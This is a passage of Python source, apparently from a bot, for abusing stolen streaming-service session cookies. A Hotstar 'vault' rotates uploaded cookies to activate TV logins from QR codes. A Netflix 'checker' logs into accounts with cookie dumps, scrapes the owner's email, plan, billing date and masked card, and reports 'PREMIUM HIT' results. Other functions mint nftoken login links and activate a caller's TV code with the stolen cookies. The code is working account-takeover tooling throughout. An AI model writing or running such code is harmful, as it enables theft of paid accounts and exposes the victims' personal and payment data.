        if not cookies.get("sessionUserUP"):
            for line in content.splitlines():
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if ";" in line and "=" in line:
                    for part in line.split(";"):
                        part = part.strip()
                        if "=" in part:
                            k, _, v = part.partition("=")
                            cookies[k.strip()] = v.strip()
                    if cookies.get("sessionUserUP"):
                        break

        if not cookies.get("sessionUserUP"):
            for line in content.splitlines():
                line = line.strip()
                if "=" in line and not line.startswith("#"):
                    k, _, v = line.partition("=")
                    cookies[k.strip()] = v.strip()

    except Exception:
        pass

    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items() if k and v)
    return {
        "cookie_dict": cookies,
        "cookie_str":  cookie_str,
        "token":       cookies.get("sessionUserUP") or cookies.get("userUP") or "",
        "device_id":   cookies.get("deviceId") or "",
    }

def hs_vault_pick_cookie() -> tuple:
    files = glob.glob(os.path.join(HS_VAULT_DIR, "*.txt"))
    if not files:
        return None, "No cookie files in vault."
    usage = hs_vault_load_usage()
    available = [fp for fp in files if usage.get(os.path.basename(fp), 0) < HS_VAULT_MAX_USES]
    if not available:
        return None, f"All vault cookies reached max uses ({HS_VAULT_MAX_USES}). Upload more."
    import random as _rnd
    _rnd.shuffle(available)
    fp = available[0]
    info = hs_vault_parse_cookie_file(fp)
    info["filepath"] = fp
    info["filename"] = os.path.basename(fp)
    return info, None

def scan_qr(image_bytes: bytes) -> Optional[str]:
    if _PYZBAR_OK:
        try:
            nparr = np.frombuffer(image_bytes, np.uint8)
            img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            if img is not None:
                decoded = pyzbar_decode(img)
                if not decoded:
                    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
                    _, thresh1 = cv2.threshold(gray, 127, 255, cv2.THRESH_BINARY)
                    decoded = pyzbar_decode(thresh1)
                if not decoded:
                    thresh2 = cv2.adaptiveThreshold(
                        gray, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C, cv2.THRESH_BINARY, 11, 2
                    )
                    decoded = pyzbar_decode(thresh2)
                if decoded:
                    return decoded[0].data.decode("utf-8")
        except Exception as e:
            logger.warning(f"Local QR scan error: {e}")

    try:
        resp = requests.post(
            "https://api.qrserver.com/v1/read-qr-code/",
            files={"file": ("qr.jpg", io.BytesIO(image_bytes), "image/jpeg")},
            timeout=15,
        )
        if resp.status_code == 200:
            data = resp.json()
            qr_text = data[0]["symbol"][0]["data"]
            if qr_text:
                return qr_text
    except Exception as e:
        logger.warning(f"API QR scan error: {e}")

    return None


def hs_vault_activate_qr(qr_url: str, cookie_info: dict) -> tuple:
    import urllib.parse as _up

    cookie_str  = cookie_info.get("cookie_str", "")
    cookie_dict = cookie_info.get("cookie_dict", {})
    if not cookie_dict:
        for part in cookie_str.split(";"):
            part = part.strip()
            if "=" in part:
                k, _, v = part.partition("=")
                cookie_dict[k.strip()] = v.strip()

    user_token = cookie_info.get("token") or cookie_dict.get("sessionUserUP") or cookie_dict.get("userUP", "")
    device_id  = cookie_info.get("device_id") or cookie_dict.get("deviceId", "")

    qr_param = ""
    try:
        parsed   = _up.urlparse(qr_url)
        qr_param = _up.parse_qs(parsed.query).get("qr_code", [""])[0]
    except Exception:
        pass

    MOBILE_UA = (
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    )

    try:
        scraper = cloudscraper.create_scraper()
        headers = {
            "authority":                 "www.hotstar.com",
            "accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language":           "en-MM,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cookie":                    cookie_str,
            "sec-ch-ua":                 '"Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile":          "?1",
            "sec-ch-ua-platform":        '"Android"',
            "sec-fetch-dest":            "document",
            "sec-fetch-mode":            "navigate",
            "sec-fetch-site":            "none",
            "upgrade-insecure-requests": "1",
            "user-agent":                MOBILE_UA,
        }
        if user_token and "userUP=" not in cookie_str:
            headers["cookie"] += f"; userUP={user_token}"

        resp      = scraper.get(qr_url, headers=headers, timeout=30, allow_redirects=True)
        status    = resp.status_code
        body      = resp.text.lower()
        final_url = resp.url

        _SUCCESS = ["success", "activated", "tv linked", "device linked",
                    "signin complete", "already logged", "already signed",
                    "watch", "home"]
        _FAIL    = ["expired", "invalid", "unauthorized", "forbidden", "not found"]

        for kw in _SUCCESS:
            if kw in body:
                return True, f"✅ Activated (HTTP {status})"

        redirected_ok = ("tv-login" not in final_url.lower() and
                         "tv-signin" not in final_url.lower() and
                         "login" not in final_url.lower())
        if status in (301, 302) or (status == 200 and redirected_ok):
            return True, f"✅ Activated (HTTP {status})"

        for kw in _FAIL:
            if kw in body:
                break
        else:
            if status == 200:
                return True, "✅ Request completed — check your TV."

    except Exception as e_a:
        e_a_str = str(e_a)[:120]
    else:
        e_a_str = None

    if user_token and qr_param:
        try:
            api_headers = {
                "User-Agent":      MOBILE_UA,
                "Accept":          "application/json, text/plain, */*",
                "Accept-Language": "en-IN,en;q=0.9",
                "Content-Type":    "application/json",
                "X-HS-UserToken":  user_token,
                "X-HS-AppId":      "hotstar.com",
                "X-Country-Code":  "IN",
                "X-Platform":      "web",
                "Referer":         "https://www.hotstar.com/",
                "Origin":          "https://www.hotstar.com",
            }
            if device_id:
                api_headers["X-HS-DeviceId"] = device_id

            api_resp = requests.post(
                "https://api.hotstar.com/in/aor/v2/partner/tv/login",
                json={"qrCode": qr_param},
                headers=api_headers, timeout=20, verify=False,
            )
            abody = api_resp.text.lower()
            for kw in ["success", "activated", "tv linked", "signin complete"]:
                if kw in abody:
                    return True, f"✅ API activated (HTTP {api_resp.status_code})"
            if api_resp.status_code in (200, 201, 204):
                for kw in ["expired", "invalid", "unauthorized", "forbidden"]:
                    if kw in abody:
                        break
                else:
                    return True, f"✅ API accepted (HTTP {api_resp.status_code})"
            return False, f"API: HTTP {api_resp.status_code} — {api_resp.text[:100]}"
        except Exception as e_b:
            return False, (f"Method A: {e_a_str or 'no match'} | "
                           f"Method B: {str(e_b)[:80]}")

    if e_a_str is None:
        return True, "✅ Request sent (HTTP 200) — check your TV."
    return False, f"Activation failed: {e_a_str}"

def hs_vault_add_zip(zip_path: str) -> tuple:
    tmp_dir = zip_path + "_extract"
    try:
        os.makedirs(tmp_dir, exist_ok=True)
        with zipfile.ZipFile(zip_path, "r") as zf:
            zf.extractall(tmp_dir)
        txts = (glob.glob(os.path.join(tmp_dir, "**", "*.txt"),  recursive=True) +
                glob.glob(os.path.join(tmp_dir, "**", "*.json"), recursive=True))
        if not txts:
            return 0, "No .txt/.json files found in ZIP."
        added = 0
        for src in txts:
            fname = os.path.basename(src)
            dest  = os.path.join(HS_VAULT_DIR, fname)
            if os.path.exists(dest):
                base, ext = os.path.splitext(fname)
                dest = os.path.join(HS_VAULT_DIR, f"{base}_{int(time.time())}{ext}")
            shutil.move(src, dest)
            added += 1
        return added, None
    except Exception as e:
        return 0, str(e)[:120]
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    NETFLIX CHECKER (simple cookie-based)                ║
# ╚══════════════════════════════════════════════════════════════════════════╝

NF_COOKIE_NAMES = {
    "NetflixId", "SecureNetflixId", "nfvdid",
    "OptanonConsent", "flwssn", "memclid",
    "profilesNewSession", "clSharedContext",
}

NF_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
         "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

NF_TOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NF_TOKEN_PARAMS  = {
    "appVersion":    "15.48.1",
    "config":        '{"billboardEnabled":"true","contentWarningEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","sharksEnabled":"true"}',
    "device_type":   "NFAPPL-02-",
    "esn":           "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom":         "phone",
    "iosVersion":    "15.8.5",
    "isTablet":      "false",
    "languages":     "en-US",
    "locale":        "en-US",
    "maxDeviceWidth":"375",
    "model":         "saget",
    "modelType":     "IPHONE8-1",
    "odpAware":      "true",
    "path":          '["account","token","default"]',
    "pathFormat":    "graph",
    "pixelDensity":  "2.0",
    "progressive":   "false",
    "responseFormat":"json",
}
NF_TOKEN_HEADERS = {
    "User-Agent":                          "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt":           "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid":     "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing":          '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version":      "15.48.1",
    "x-netflix.argo.translated":          "true",
    "x-netflix.context.form-factor":      "phone",
    "x-netflix.context.sdk-version":      "2012.4",
    "x-netflix.client.appversion":        "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests":         "",
    "x-netflix.tracing.cl.useractionid":  "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type":              "argo",
    "x-netflix.client.ftl.esn":           "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales":          "en-US",
    "x-netflix.context.top-level-uuid":   "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion":        "15.8.5",
    "accept-language":                    "en-US;q=1",
    "x-netflix.argo.abtests":             "",
    "x-netflix.context.os-version":       "15.8.5",
    "x-netflix.request.client.context":   '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor":        "argo",
    "x-netflix.argo.nfnsm":              "9",
    "x-netflix.context.pixel-density":    "2.0",
    "x-netflix.request.toplevel.uuid":    "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid":"Asia/Dhaka",
}

DIV_NF = "═" * 27


def nf_canonicalize(name: str) -> str:
    _map = {n.lower(): n for n in NF_COOKIE_NAMES}
    return _map.get(str(name or "").strip().lower(), str(name or "").strip())


def nf_parse_cookie_file(text: str) -> list:
    text    = text.strip()
    results = []

    try:
        if text.startswith(("{", "[")):
            obj = json.loads(text)
            if isinstance(obj, dict):
                cd = {k: str(v) for k, v in obj.items() if k in NF_COOKIE_NAMES}
                if cd.get("NetflixId"):
                    results.append(("json_flat", cd))
                if "cookies" in obj and isinstance(obj["cookies"], list):
                    merged = {}
                    for c in obj["cookies"]:
                        if isinstance(c, dict) and c.get("name") in NF_COOKIE_NAMES:
                            merged[c["name"]] = str(c.get("value", ""))
                    if merged.get("NetflixId"):
                        results.append(("json_nested", merged))
            elif isinstance(obj, list):
                merged = {}
                for c in obj:
                    if isinstance(c, dict):
                        n = c.get("name") or c.get("key")
                        v = c.get("value")
                        if n and v and n in NF_COOKIE_NAMES:
                            merged[n] = v
                if merged.get("NetflixId"):
                    results.append(("json_list", merged))
    except Exception:
        pass

    ns = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        elif line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            n = nf_canonicalize(parts[5])
            if n in NF_COOKIE_NAMES:
                ns.append({"name": n, "value": parts[6]})
    if ns:
        ids = [e for e in ns if e["name"] == "NetflixId"]
        for i, nf in enumerate(ids):
            cd = {"NetflixId": nf["value"]}
            for e in ns:
                if e["name"] != "NetflixId":
                    cd[e["name"]] = e["value"]
            results.append((f"netscape_{i}", cd))
        if not ids:
            results.append(("netscape_all", {e["name"]: e["value"] for e in ns}))

    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        sc = {}
        for part in line.split(";"):
            part = part.strip()
            if "=" in part:
                k, _, v = part.partition("=")
                k = nf_canonicalize(k.strip())
                if k in NF_COOKIE_NAMES:
                    sc[k] = v.strip()
        if sc.get("NetflixId"):
            results.append((f"semi_{len(results)}", sc))

    kv = {}
    for line in text.splitlines():
        line = line.strip()
        if "=" in line and not line.startswith("#"):
            k, _, v = line.partition("=")
            k = nf_canonicalize(k.strip())
            if k in NF_COOKIE_NAMES:
                kv[k] = v.strip()
    if kv.get("NetflixId"):
        results.append(("keyvalue", kv))

    for m in re.finditer(r'NetflixId\s*[:=]\s*([^\s;,\n"\']{20,})', text, re.IGNORECASE):
        nf_val = m.group(1).strip("\"'")
        cd = {"NetflixId": nf_val}
        for cn in NF_COOKIE_NAMES - {"NetflixId"}:
            rm = re.search(rf'{cn}\s*[:=]\s*([^\s;,\n"\']+)', text, re.IGNORECASE)
            if rm:
                cd[cn] = rm.group(1).strip("\"'")
        results.append((f"regex_{len(results)}", cd))

    seen, deduped = set(), []
    for bn, cd in results:
        nfid = cd.get("NetflixId", "")
        if nfid and nfid not in seen:
            seen.add(nfid)
            deduped.append((bn, cd))
    return deduped


def nf_safe(text) -> str:
    if not text:
        return "Unknown"
    text = str(text)
    text = re.sub(r'([A-Za-z0-9._%+-]{2})[A-Za-z0-9._%+-]*(@[A-Za-z0-9.-]+\.[A-Za-z]{2,})',
                  lambda m: f"{m.group(1)}***{m.group(2)}", text)
    text = re.sub(r'(\+?\d{2})\d{2,}(\d{2})', lambda m: f"{m.group(1)}***{m.group(2)}", text)
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def nf_check_one(cookie_dict: dict) -> dict:
    if not cookie_dict.get("NetflixId"):
        return {"status": "DEAD", "reason": "No NetflixId", "cookie": cookie_dict, "content": ""}
    session = requests.Session()
    session.cookies.update(cookie_dict)
    headers = {
        "User-Agent":      NF_UA,
        "Accept":          "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    }
    try:
        resp, txt = None, ""
        for url in ["https://www.netflix.com/YourAccount", "https://www.netflix.com/account"]:
            try:
                r = session.get(url, headers=headers, timeout=25, allow_redirects=True)
                if r.status_code == 200 and "Account" in r.text:
                    resp, txt = r, r.text
                    break
            except Exception:
                continue
        if not resp or resp.status_code != 200:
            return {"status": "DEAD", "reason": f"HTTP {resp.status_code if resp else 'error'}",
                    "cookie": cookie_dict, "content": ""}
        if "login" in resp.url.lower() or "signin" in resp.url.lower():
            return {"status": "DEAD", "reason": "Redirected to login", "cookie": cookie_dict, "content": ""}

        def find(pat):
            m = re.search(pat, txt)
            return nf_safe(m.group(1)) if m else None

        name         = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
        plan_raw     = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
        country      = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"currentCountry"\s*:\s*"([^"]+)"')
        email        = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"loginId"\s*:\s*"([^"]+)"')
        member_since = find(r'"memberSince":"([^"]+)"')
        next_billing = find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"')
        plan_price   = find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
        payment      = find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
        card         = find(r'"paymentCardDisplayString"\s*:\s*"([^"]+)"')
        quality      = find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
        streams      = find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
        extra        = "Yes" if re.search(r'"showExtraMemberSection".*?true', txt) else "No"
        email_ver    = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"
        guid         = find(r'"userGuid":\s*"([^"]+)"')
        ms_m         = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        ms           = ms_m.group(1) if ms_m else None
        is_prem      = (ms == "CURRENT_MEMBER") if ms else bool(plan_raw and "free" not in str(plan_raw).lower())
        has_data     = any([name, email, country, plan_raw, ms, guid])
        if not has_data:
            return {"status": "DEAD", "reason": "No account data found",
                    "cookie": cookie_dict, "content": ""}

        profiles_str = None
        try:
            rp = session.get("https://www.netflix.com/ManageProfiles", timeout=12)
            if rp.status_code == 200:
                profs = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text)
                if not profs:
                    profs = re.findall(r'"displayName"\s*:\s*"([^"]+)"', rp.text)
                if profs:
                    profiles_str = ", ".join(nf_safe(p) for p in profs)
        except Exception:
            pass

        expiry = int(time.time()) + 180 * 24 * 3600
        ns = ["# Netscape HTTP Cookie File"]
        for k, v in cookie_dict.items():
            secure = "TRUE" if k == "SecureNetflixId" else "FALSE"
            ns.append(f".netflix.com\tTRUE\t/\t{secure}\t{expiry}\t{k}\t{v}")

        return {
            "status":           "PREMIUM" if is_prem else "FREE",
            "name":             name or "Unknown",
            "email":            email or "Unknown",
            "country":          country or "Unknown",
            "plan":             plan_raw or "Unknown",
            "plan_price":       plan_price or "Unknown",
            "member_since":     member_since or "Unknown",
            "next_billing":     next_billing or "Unknown",
            "payment_method":   payment or "Unknown",
            "masked_card":      card or "Unknown",
            "quality":          quality or "Unknown",
            "streams":          streams or "Unknown",
            "extra_member":     extra,
            "email_verified":   email_ver,
            "membership_status":ms or "Unknown",
            "profiles":         profiles_str or "Unknown",
            "guid":             guid or "Unknown",
            "cookie":           cookie_dict,
            "content":          "\n".join(ns),
        }
    except Exception as e:
        return {"status": "DEAD", "reason": str(e)[:80], "cookie": cookie_dict, "content": ""}


def nf_generate_token(cookie_dict: dict) -> dict:
    nfid = cookie_dict.get("NetflixId")
    if not nfid:
        return {"status": "DEAD", "reason": "No NetflixId"}
    headers = dict(NF_TOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={nfid}"
    try:
        r = requests.get(NF_TOKEN_API_URL, params=NF_TOKEN_PARAMS,
                         headers=headers, timeout=20, verify=False)
        r.raise_for_status()
        data   = r.json()
        td     = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        token  = td.get("token")
        expiry = td.get("expires")
        if not token:
            return {"status": "DEAD", "reason": "Dead cookie"}
        if isinstance(expiry, int) and len(str(expiry)) == 13:
            expiry //= 1000
        exp_str = datetime.fromtimestamp(expiry).strftime("%Y-%m-%d %H:%M:%S") if expiry else "Unknown"
        return {"status": "TOKEN", "token": token, "expires": exp_str, "cookie": cookie_dict}
    except Exception as e:
        return {"status": "DEAD", "reason": str(e)[:80]}


def nf_check_file(fp: str, sub: str) -> dict:
    try:
        with open(fp, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        parsed = nf_parse_cookie_file(content)
        if not parsed:
            return {"status": "DEAD", "reason": "No Netflix cookies found",
                    "filename": os.path.basename(fp), "content": ""}
        _, cd = parsed[0]
        result = nf_generate_token(cd) if sub == "nftoken" else nf_check_one(cd)
        result.setdefault("filename", os.path.basename(fp))
        result.setdefault("content", "")
        return result
    except Exception as e:
        return {"status": "DEAD", "reason": str(e)[:80],
                "filename": os.path.basename(fp), "content": ""}


def nf_vault_count() -> int:
    return len(glob.glob(os.path.join(NF_VAULT_DIR, "*.txt")) +
               glob.glob(os.path.join(NF_VAULT_DIR, "*.json")))


def nf_vault_pick_and_consume() -> tuple:
    import random as _rnd
    files = (glob.glob(os.path.join(NF_VAULT_DIR, "*.txt")) +
             glob.glob(os.path.join(NF_VAULT_DIR, "*.json")))
    if not files:
        return None, "No cookies in vault"
    _rnd.shuffle(files)
    for fp in files:
        try:
            with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            parsed = nf_parse_cookie_file(content)
            if not parsed:
                os.remove(fp)
                continue
            _, cd = parsed[0]
            if not cd.get("NetflixId"):
                os.remove(fp)
                continue
            fname = os.path.basename(fp)
            os.remove(fp)
            return cd, fname
        except Exception:
            continue
    return None, "All vault cookies invalid or empty"


def nf_vault_add_zip(zip_path: str) -> tuple:
    tmp_dir = zip_path + "_nf_extr"
    try:
        os.makedirs(tmp_dir, exist_ok=True)
        with zipfile.ZipFile(zip_path, "r") as zf:
            zf.extractall(tmp_dir)
        files = (glob.glob(os.path.join(tmp_dir, "**", "*.txt"),  recursive=True) +
                 glob.glob(os.path.join(tmp_dir, "**", "*.json"), recursive=True))
        if not files:
            return 0, "No .txt/.json files found in ZIP."
        added = 0
        for src in files:
            fname = os.path.basename(src)
            dest  = os.path.join(NF_VAULT_DIR, fname)
            if os.path.exists(dest):
                base, ext = os.path.splitext(fname)
                dest = os.path.join(NF_VAULT_DIR, f"{base}_{int(time.time())}{ext}")
            shutil.move(src, dest)
            added += 1
        return added, None
    except Exception as e:
        return 0, str(e)[:120]
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)


def nf_extract_auth_url(html_text: str) -> Optional[str]:
    import urllib.parse as _up
    for pat in [r'name="authURL"\s+value="([^"]+)"',
                r'authURL["\']?\s*[:=]\s*["\']([^"]+)["\']',
                r'value="(c1\.[^"]+)"']:
        m = re.search(pat, html_text)
        if m:
            return _up.unquote(m.group(1))
    m = re.search(r'c1\.[a-zA-Z0-9%+=/_-]+', html_text)
    return m.group(0) if m else None


def nf_submit_tv_code(session, tv_code: str) -> dict:
    headers = {
        "User-Agent":      NF_UA,
        "Accept":          "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        r = session.get("https://www.netflix.com/tv8", headers=headers,
                        timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200:
            return {"success": False, "error": f"TV page HTTP {r.status_code}"}
    except Exception as e:
        return {"success": False, "error": f"Connection failed: {str(e)[:60]}"}
    auth_url = nf_extract_auth_url(r.text)
    if not auth_url:
        return {"success": False, "error": "Could not load activation page (no authURL)"}
    form = {
        "flow":                    "websiteSignUp",
        "authURL":                 auth_url,
        "flowMode":                "enterTvLoginRendezvousCode",
        "withFields":              "tvLoginRendezvousCode,isTvUrl2",
        "code":                    tv_code,
        "tvLoginRendezvousCode":   tv_code,
        "action":                  "nextAction",
    }
    post_h = {**headers,
              "Content-Type": "application/x-www-form-urlencoded",
              "Referer": "https://www.netflix.com/tv8",
              "Origin":  "https://www.netflix.com"}
    try:
        r = session.post("https://www.netflix.com/tv8", data=form, headers=post_h,
                         timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
    except Exception as e:
        return {"success": False, "error": f"Activation request failed: {str(e)[:60]}"}
    final_url  = r.url
    text_clean = re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', ' ', r.text)).strip().lower()
    if "/tv/out/success" in final_url.lower() or ("success" in final_url.lower() and "tv" in final_url.lower()):
        return {"success": True, "error": None}
    for pat in [r"your tv is ready", r"successfully activated", r"t[ée]l[ée]vision activ[ée]"]:
        if re.search(pat, text_clean):
            return {"success": True, "error": None}
    for pat in [r"that code wasn'?t right", r"code (is )?(incorrect|invalid|wrong|expired)", r"try again"]:
        if re.search(pat, text_clean):
            return {"success": False, "error": "Invalid or expired TV code"}
    if "/tv/" in final_url.lower() and "code" not in final_url.lower():
        return {"success": True, "error": None}
    return {"success": False, "error": "Unknown response from Netflix"}


def nf_process_tv_login(tv_code: str) -> dict:
    tried, countries = 0, []
    while True:
        cd, info = nf_vault_pick_and_consume()
        if cd is None:
            return {"success": False,
                    "error": "no_cookies_left" if tried == 0 else "all_cookies_failed",
                    "tried": tried, "countries": countries}
        tried += 1
        session = requests.Session()
        session.cookies.update(cd)
        headers = {"User-Agent": NF_UA, "Accept": "text/html,application/xhtml+xml"}
        try:
            r = session.get("https://www.netflix.com/YourAccount", headers=headers,
                            timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
            if "login" in r.url.lower() or r.status_code != 200:
                continue
            country_m = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', r.text)
            plan_m    = re.search(r'"localizedPlanName".*?"value":"([^"]+)"', r.text)
            country   = country_m.group(1) if country_m else None
            plan      = plan_m.group(1) if plan_m else "Unknown"
            if not country:
                continue
            countries.append(country)
        except Exception:
            continue
        result = nf_submit_tv_code(session, tv_code)
        result["country"] = country
        result["plan"]    = plan
        result["tried"]   = tried
        result["countries"] = countries
        if result["success"]:
            return result
        if "Invalid" in str(result.get("error", "")) or "expired" in str(result.get("error", "")).lower():
            return result


def nf_clean_cookies_to_zip(content: str) -> tuple:
    parsed = nf_parse_cookie_file(content)
    if not parsed:
        return None, 0
    expiry = int(time.time()) + 180 * 24 * 3600
    buf, valid = io.BytesIO(), 0
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for idx, (_, cd) in enumerate(parsed, 1):
            if cd.get("NetflixId"):
                valid += 1
                lines = ["# Netscape HTTP Cookie File"]
                for k, v in cd.items():
                    secure = "TRUE" if k == "SecureNetflixId" else "FALSE"
                    lines.append(f".netflix.com\tTRUE\t/\t{secure}\t{expiry}\t{k}\t{v}")
                zf.writestr(f"Netflix_Cookie_{idx}.txt", "\n".join(lines))
    buf.seek(0)
    return buf, valid


def nf_fmt_premium(r: dict) -> str:
    return (
        f"{SP_MUSIC} <b>{DIV_NF}</b>\n"
        f"      {SP_PREMIUM}  <b>NETFLIX PREMIUM HIT</b>\n"
        f"{SP_MUSIC} <b>{DIV_NF}</b>\n\n"
        f"{E_EMAIL}   <b>Email   :</b>  <code>{r.get('email','Unknown')}</code>\n"
        f"{E_PLAN}   <b>Plan    :</b>  <code>{r.get('plan','Unknown')}</code>\n"
        f"{E_COUNTRY}   <b>Country :</b>  <code>{r.get('country','Unknown')}</code>\n"
        f"{SP_BOLT}   <b>Quality :</b>  <code>{r.get('quality','Unknown')}</code>\n"
        f"{E_COUNT}   <b>Streams :</b>  <code>{r.get('streams','Unknown')}</code>\n"
        f"{E_PLAN}   <b>Price   :</b>  <code>{r.get('plan_price','Unknown')}</code>\n"
        f"{E_DATE}   <b>Billing :</b>  <code>{r.get('next_billing','Unknown')}</code>"
    )


def nf_fmt_free(r: dict) -> str:
    return (
        f"{SP_FREE}  <b>NETFLIX FREE ACCOUNT</b>\n"
        f"──────────────────────────────\n\n"
        f"{E_EMAIL}   <b>Email   :</b>  <code>{r.get('email','Unknown')}</code>\n"
        f"{E_COUNTRY}   <b>Country :</b>  <code>{r.get('country','Unknown')}</code>\n"
        f"{E_PLAN}   <b>Plan    :</b>  <code>{r.get('plan','Netflix Free')}</code>\n"
        f"{SP_PREMIUM}   <b>Status  :</b>  <code>{r.get('membership_status','Unknown')}</code>"
    )


def nf_fmt_dead(r: dict) -> str:
    return (
        f"{SP_DEAD}  <b>DEAD</b>\n"
        f"──────────────────────────────\n"
        f"<i>{r.get('reason','Cookie invalid or expired')}</i>"
    )


def nf_fmt_token(r: dict) -> str:
    tok = r.get("token", "Unknown")
    return (
        f"{SP_CODE}  <b>NF TOKEN GENERATED</b>\n"
        f"──────────────────────────────\n\n"
        f"{SP_CODE}   <b>Token   :</b>  <code>{tok[:50]}…</code>\n"
        f"{E_DATE}   <b>Expires :</b>  <code>{r.get('expires','Unknown')}</code>\n\n"
        f"<b>Links:</b>\n"
        f"📱 <a href=\"https://www.netflix.com/unsupported?nftoken={tok}\">Phone</a>  "
        f"🖥️ <a href=\"https://www.netflix.com/browse?nftoken={tok}\">Desktop</a>  "
        f"📺 <a href=\"https://www.netflix.com/tv8?nftoken={tok}\">TV</a>"
    )


def nf_fmt_progress(done: int, total: int, hits: int, free: int, dead: int, sub: str) -> str:
    pct    = done / total if total else 0
    filled = int(pct * 10)
    bar    = "█" * filled + "░" * (10 - filled)
    if sub == "nftoken":
        return (
            f"{SP_CODE}  <b>NF Token — Running…</b>\n\n"
            f"<code>[{bar}]  {int(pct*100)}%</code>\n\n"
            f"{SP_CODE} Tokens: <b>{hits}</b>   {SP_DEAD} Failed: <b>{dead}</b>\n"
            f"{E_FILE}  <b>{done}</b> / <b>{total}</b> checked"
        )
    return (
        f"{SP_BOLT}  <b>Netflix Check — Running…</b>\n\n"
        f"<code>[{bar}]  {int(pct*100)}%</code>\n\n"
        f"{SP_PREMIUM} <b>{hits}</b>   {SP_FREE} <b>{free}</b>   {SP_DEAD} <b>{dead}</b>\n"
        f"{E_FILE}  <b>{done}</b> / <b>{total}</b> checked"
    )


def nf_fmt_summary(hits: int, free: int, dead: int, total: int, elapsed: float, sub: str) -> str:
    if sub == "nftoken":
        return (
            f"{SP_MUSIC} <b>{DIV_NF}</b>\n"
            f"        {SP_CODE}  <b>TOKEN GEN COMPLETE</b>\n"
            f"{SP_MUSIC} <b>{DIV_NF}</b>\n\n"
            f"{E_COUNT}   <b>Total   :</b>  <code>{total}</code>\n"
            f"{SP_CODE}   <b>Tokens  :</b>  <code>{hits}</code>\n"
            f"{SP_DEAD}   <b>Failed  :</b>  <code>{dead}</code>\n\n"
            f"{E_CLOCK}   <b>Time    :</b>  <code>{elapsed:.1f}s</code>"
        )
    return (
        f"{SP_MUSIC} <b>{DIV_NF}</b>\n"
        f"        {SP_SPARK}  <b>NETFLIX CHECK COMPLETE</b>\n"
        f"{SP_MUSIC} <b>{DIV_NF}</b>\n\n"
        f"{E_COUNT}   <b>Total   :</b>  <code>{total}</code>\n"
        f"{SP_PREMIUM}   <b>Premium :</b>  <code>{hits}</code>\n"
        f"{SP_FREE}   <b>Free    :</b>  <code>{free}</code>\n"
